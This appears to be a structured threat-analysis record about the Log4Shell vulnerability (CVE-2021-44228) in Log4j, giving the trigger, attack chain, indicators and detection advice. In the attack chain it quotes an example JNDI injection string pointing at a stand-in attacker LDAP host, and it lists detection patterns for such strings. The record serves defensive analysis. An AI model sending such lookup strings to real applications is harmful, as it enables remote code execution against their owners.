package_info.why_malicious: The Log4j package contains a critical vulnerability (Log4Shell, CVE-2021-44228) that allows attackers to perform remote code execution (RCE) by exploiting the JNDI lookup feature. This enables adversaries to execute arbitrary code on affected systems, making it a high-value target for threat actors.

execution_context.trigger: runtime (when a log message is processed)
execution_context.file_location: core Log4j library (JndiLookup class, used in log message parsing)

malicious_snippets.code_language: java (expression in log message, triggers Java JNDI subsystem)
malicious_snippets.code_behavior: At runtime, when a crafted log message containing a JNDI lookup string is processed, the code triggers a remote lookup via LDAP, downloads and executes attacker-controlled Java code, resulting in remote code execution.

malice_analysis.why_suspicious: This behavior allows untrusted user input to trigger network requests and load/execute remote code, which is highly dangerous.
malice_analysis.violated_expectations: Normal logging libraries should never execute code or perform network lookups based on log message content. Logging should be passive.
malice_analysis.similar_legitimate_use: JNDI lookups are legitimate in enterprise Java for dynamic resource resolution, but not in log message parsing.
key_indicators: Presence of ${jndi:...} patterns in log messages
Network requests to attacker-controlled LDAP/RMI servers
Dynamic code loading based on log content

attack_chain.action: Attacker sends a specially crafted log message containing a JNDI lookup string (e.g., ${jndi:ldap://attacker.com/a}) to a vulnerable application.
attack_chain.leads_to: Log4j processes the log message and triggers a remote JNDI lookup.

attack_chain.action: The vulnerable Log4j instance performs a network request to the attacker's LDAP server, retrieves and executes malicious Java code.
attack_chain.leads_to: Remote code execution on the victim system, allowing full attacker control.

behavioral_signatures: Log message processing triggers outbound LDAP/RMI network requests
Presence of ${jndi:...} patterns in log data or application input
Unexpected dynamic code execution during logging operations
file_indicators: Log4j versions 2.0-beta9 through 2.14.1 in dependency manifests (pom.xml, build.gradle, etc.)
JndiLookup.class present in deployed application jars
network_indicators: Outbound LDAP/RMI/DNS requests to untrusted or external domains
Connections to attacker infrastructure following log events
detection_knowledge.how_to_detect: Monitor application logs and network traffic for suspicious ${jndi:...} patterns and unexpected outbound LDAP/RMI requests. Scan dependency manifests for vulnerable Log4j versions. Use runtime instrumentation to detect dynamic code loading triggered by log message content. Block or alert on any log message that attempts to resolve JNDI lookups from untrusted sources.
